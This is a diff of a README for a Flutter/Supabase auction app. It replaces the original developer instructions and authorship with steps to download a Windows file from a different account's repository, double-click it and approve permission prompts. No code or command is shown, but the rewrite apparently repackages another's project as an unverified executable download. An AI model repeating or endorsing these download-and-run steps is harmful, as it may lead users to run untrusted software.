@@ -1,150 +1,205 @@
+# 🎨 Ubel-Auction - Rare Finds, Simple Bidding
 
-# 💎 Ubel: Premium Real-Time Auction App
+[![Download Ubel-Auction](https://img.shields.io/badge/Download-Ubel--Auction-blue?style=for-the-badge)](https://github.com/hiwhatsup12/Ubel-Auction)
 
-A production-ready, high-end auction marketplace built with **Flutter** and **Supabase**. Ubel demonstrates enterprise-level architecture, real-time data synchronization, and a luxury-focused Material 3 design system.
+## 🖥️ What You Need
 
----
+Before you install Ubel-Auction on Windows, make sure your PC has:
 
-## 📸 App Preview
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection
+- Mouse and keyboard support
 
-| Home Screen | Auction Detail | Create Listing |
-| :---: | :---: | :---: |
-| <img src="https://via.placeholder.com/400x800.png?text=Home+Screen" width="200" /> | <img src="https://via.placeholder.com/400x800.png?text=Detail+Screen" width="200" /> | <img src="https://via.placeholder.com/400x800.png?text=Create+Screen" width="200" /> |
+If you plan to keep lots of items open at once, 8 GB of RAM gives a smoother experience.
 
-> 
----
+## 📥 Download Ubel-Auction
 
-## 🚀 Key Features
+Visit this page to download Ubel-Auction:
 
-- **Real-time Bidding**: Instant, live bid updates using Supabase Realtime (WebSockets).
-- **Luxury UI/UX**: Custom animations, shimmer loading effects, and smooth page transitions via GoRouter.
-- **Dynamic Category Selection**: Interactive grid-based category picking (Art, Collectibles, Memes, etc.).
-- **Secure Authentication**: JWT-based authentication with persistent sessions.
-- **Media Management**: High-performance image caching and Supabase Storage integration for uploads.
-- **Atomic Transactions**: Database-level functions to ensure bid integrity and prevent race conditions.
+https://github.com/hiwhatsup12/Ubel-Auction
 
----
+On that page, look for the latest release or the main download file. After the file finishes downloading, keep it in your Downloads folder so you can find it easily.
 
-## 🛠 Tech Stack
+## 🚀 Install on Windows
 
-- **Framework**: Flutter 3.x (latest stable)
-- **State Management**: Riverpod 2.x (with Generators & AsyncNotifier)
-- **Backend**: Supabase (PostgreSQL, Realtime, Auth, Storage)
-- **Routing**: GoRouter (Declarative routing with deep link support)
-- **Networking**: Dio + Supabase Flutter SDK
-- **Database**: PostgreSQL with Row Level Security (RLS)
-- **Local Storage**: Flutter Secure Storage
+Follow these steps to get Ubel-Auction running:
 
----
+1. Open the download page in your web browser.
+2. Find the latest version of the app.
+3. Download the Windows file if one is listed.
+4. Open your Downloads folder.
+5. Double-click the file you downloaded.
+6. If Windows asks for permission, choose Yes or Run.
+7. Wait for the app to finish opening.
 
-## 🏗 Architecture (Screaming Architecture)
+If you downloaded a ZIP file, right-click it and choose Extract All first. Then open the extracted folder and start the app from there.
 
-Ubel follows a feature-first **Clean Architecture** pattern to ensure the codebase remains maintainable and scalable.
+## 🧭 First Launch
 
-```text
-lib/
-├── features/          # Feature-based modules
-│   ├── auth/          # Authentication & User onboarding
-│   ├── auction/       # Core marketplace & listing logic
-│   ├── bidding/       # Real-time bid streams & placement
-│   └── profile/       # User management & listing history
-├── core/              # Shared theme (AppColors), extensions, & utilities
-├── services/          # Supabase client & external API wrappers
-└── widgets/           # Global UI components (AppImage, Buttons, etc.)
-```
+When Ubel-Auction opens for the first time, you may see a sign-in screen or a home page with auction items.
 
----
+To get started:
 
-## 🚦 Getting Started
+- Open the app
+- Sign in if asked
+- Check the home feed
+- Browse art, collectibles, and meme listings
+- Tap an item to view its details
+- Place a bid if you want to join the auction
 
-### Prerequisites
-- Flutter SDK >= 3.0.0
-- A Supabase Project ([supabase.com](https://supabase.com))
+If the app asks for internet access, allow it so live bidding can work.
 
-### Installation
+## 🎯 What Ubel-Auction Does
 
-1. **Clone the repository**
-   ```bash
-   git clone [https://github.com/toe-dot-tech/ubel.git](https://github.com/toe-dot-tech/ubel.git)
-   cd ubel
-   ```
+Ubel-Auction is a marketplace for rare items and live bidding. It is made for people who want a clean way to browse and bid on unique listings.
 
-2. **Install dependencies**
-   ```bash
-   flutter pub get
-   ```
+You can use it to:
 
-3. **Database Setup (SQL)**
-   Run the following in your Supabase SQL Editor to enable the bidding logic:
-   - Apply schema from `database/schema.sql`.
-   - Enable **Realtime** for `auctions` and `bids` tables.
-   - Deploy the `place_bid()` RPC function for atomic transactions.
+- Look through rare art and collectibles
+- Join live auctions
+- See bid updates in real time
+- Track item prices as they change
+- Review item details before you bid
+- Place bids with clear feedback
 
-4. **Environment Configuration**
-   Update your Supabase credentials in `lib/main.dart` (or use a `.env` file):
-   ```dart
-   await Supabase.initialize(
-     url: 'YOUR_SUPABASE_URL',
-     anonKey: 'YOUR_ANON_KEY',
-   );
-   ```
+The app uses live updates, so bids can appear on screen without you refreshing the page.
 
-5. **Run the app**
-   ```bash
-   flutter run
-   ```
+## ⚡ Main Features
 
----
+- Real-time bidding
+- Clean, simple layout
+- Easy item browsing
+- Live auction updates
+- Fast screen changes
+- Secure data handling
+- Smooth mobile-style design on Windows
+- Clear item cards and auction views
+- Modern Material 3 interface
+- Account-based access for saved activity
 
-## 🔧 Enterprise-Grade Implementation
+## 🧩 How Bidding Works
 
-### ⚡ Atomic Bidding System
-To prevent race conditions where two users bid at the same microsecond, Ubel uses a PostgreSQL function:
-- Validates if the auction is still active.
-- Ensures the bid is higher than the current price.
-- Atomically updates the `current_price` and `bid_count`.
+Ubel-Auction shows current auction details on screen. When you place a bid, the app sends it right away and updates the item view.
 
-### 🧠 Modern State Management
-- **Riverpod Generators**: Used for type-safe, compile-time provider generation.
-- **Family Providers**: Efficiently manages state for specific IDs without global pollution.
-- **Invalidation Logic**: Uses `ref.invalidate()` for clean manual refreshes (Pull-to-Refresh).
+Typical bid flow:
 
-### 🔗 Deep Linking
-Configured via **GoRouter** to support universal links:
-- `ubel://auction/:id` - Navigate directly to a specific item from a shared link.
+1. Open an item
+2. Check the current bid
+3. Enter your offer
+4. Submit the bid
+5. Watch the live update
 
----
+If another user places a higher bid, the app updates the listing so you can respond.
 
-## 🛡 Security
-- **Row Level Security (RLS)**: Users can only update their own listings.
-- **Server-Side Validation**: Bids are validated on the database level, not just the UI.
-- **Secure Storage**: Sensitive tokens are stored in encrypted local storage.
+## 🛠️ Troubleshooting
 
----
+If the app does not open:
 
-## 🏢 Portfolio Highlight
+- Check that the download finished
+- Make sure you opened the correct file
+- Try running it again as the current user
+- Restart your PC and open the app again
 
-This project demonstrates expertise in:
-- **Real-time Data Architecture** (Supabase/WebSockets)
-- **Clean Code & Linting** (Strict analysis options)
-- **Complex UI Performance** (Virtualization, Image Caching)
-- **Scale-Ready Design** (Riverpod/Clean Architecture)
+If the screen stays blank:
 
----
+- Check your internet connection
+- Close the app and open it again
+- Make sure your browser or firewall is not blocking access
 
-## 🤝 Contributing
+If the app feels slow:
 
-1. Fork the Project.
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`).
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`).
-4. Push to the Branch (`git push origin feature/AmazingFeature`).
-5. Open a Pull Request.
+- Close other large apps
+- Restart Windows
+- Keep fewer browser tabs open
+- Make sure your PC meets the basic system needs
 
----
+If you cannot find the file:
 
-## 📄 License
-Distributed under the MIT License. See `LICENSE` for more information.
+- Open your Downloads folder
+- Sort by date
+- Look for the newest file with the Ubel-Auction name
 
----
-**Built with ❤️ by TOE Tech**
+## 🔐 Privacy and Data
 
+Ubel-Auction uses online services to manage accounts, bids, and live updates. That helps the app keep auction data current across devices.
+
+Your activity may include:
+
+- Login details
+- Bid history
+- Saved items
+- Auction status
+- Item view history
+
+Use a strong password and sign out when you use a shared PC.
+
+## 🧪 Best Use Tips
+
+- Keep the app open during live bidding
+- Refresh only if the app stops updating
+- Read item details before placing a bid
+- Check the current price before you make an offer
+- Use a stable internet connection during auctions
+- Leave enough time to respond to last-second bids
+
+## 📱 App Areas You May See
+
+Depending on the version you run, you may see areas like:
+
+- Home
+- Search
+- Live Auctions
+- Item Details
+- My Bids
+- Saved Items
+- Profile
+- Settings
+
+These sections help you browse listings and follow auctions without confusion.
+
+## 🖼️ Supported Content
+
+Ubel-Auction is built for a wide mix of listings, including:
+
+- Rare art
+- Collectibles
+- Memes
+- Limited items
+- Featured auction lots
+- New arrivals
+
+Each listing is set up to show useful details so you can decide if you want to bid.
+
+## 🔄 Updates
+
+When a newer version is posted, repeat the download steps on the repository page:
+
+https://github.com/hiwhatsup12/Ubel-Auction
+
+Use the newest file so you get the latest fixes, layout changes, and bidding updates.
+
+## 🧰 Common Setup Questions
+
+### Do I need to know programming?
+No. You only need to download the file, open it, and follow the screen prompts.
+
+### Can I use it offline?
+You can open parts of the app only if they are already loaded, but live bidding needs internet access.
+
+### Is this only for auctions?
+The app focuses on auctions, but it also works as a marketplace for browsing rare listings.
+
+### What if I use a work or school PC?
+You may need permission to run downloaded files. If the app does not open, ask the device owner or admin for help.
+
+## 📌 Repository Details
+
+- Name: Ubel-Auction
+- Type: Auction marketplace app
+- Build tools: Flutter, Supabase
+- Design style: Clean Architecture
+- Live sync: WebSocket bidding
+- Database behavior: Atomic transactions
+- Topics: auction, auction-app, clean-architecture, dart, flutter, marketplace, material-3, realtime-bidding, riverpod, supabase
